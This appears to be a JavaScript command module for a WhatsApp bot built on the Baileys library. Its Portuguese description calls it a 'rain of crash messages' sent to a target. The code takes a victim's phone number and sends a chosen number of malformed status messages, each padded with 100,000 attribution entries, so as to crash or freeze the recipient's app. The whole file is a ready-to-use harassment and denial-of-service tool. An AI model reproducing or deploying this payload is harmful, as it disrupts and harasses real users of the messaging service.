import { generateWAMessageFromContent, proto } from "baileys"

export default {
    name: "crash2",
    aliases: ["travar"],
    description: "Envia uma chuva de travas pro alvo",
    category: "creator",

    async run({ sock, msg, args }) {
        const from = msg.key.remoteJid
        const targetNum = args[0]?.replace(/[^0-9]/g, '')
        const qtd = parseInt(args[1]) || 1

        if (!targetNum) return sock.sendMessage(from, { text: "Manda o número do alvo e a quantidade, João! 🫡" }, {quoted: msg})

        const target = targetNum + "@s.whatsapp.net"
        await sock.sendMessage(from, { react: { text: "⏳", key: msg.key } })

        try {
            for (let i = 0; i < qtd; i++) {
                const msgData = {
                    groupStatusMessageV2: {
                        message: {
                            interactiveResponseMessage: {
                                body: { text: " ".repeat(500), format: "DEFAULT" },
                                nativeFlowResponseMessage: {
                                    name: "call_permission_request",
                                    paramsJson: '{"test": "true"}',
                                    version: 3
                                },
                                contextInfo: {
                                    remoteJid: "status@broadcast",
                                    statusAttributionType: "RESHARED_FROM_POST",
                                    isQuestion: true,
                                    statusAttributions: Array(100000).fill({ type: "EXTERNAL_SHARE" })
                                }
                            }
                        }
                    }
                }

                const preparedMsg = generateWAMessageFromContent(target, proto.Message.fromObject(msgData), { userJid: target })
                await sock.relayMessage(target, preparedMsg.message, { messageId: preparedMsg.key.id })
            }

            await sock.sendMessage(from, { text: `✅ ${qtd} pacotes enviados.` }, { quoted: msg })
        } catch (e) {
            console.log("Erro no ataque do João Tank:", e)
            await sock.sendMessage(from, { text: "Deu erro no envio, mestre. Vê o console!" })
        }
    }
}
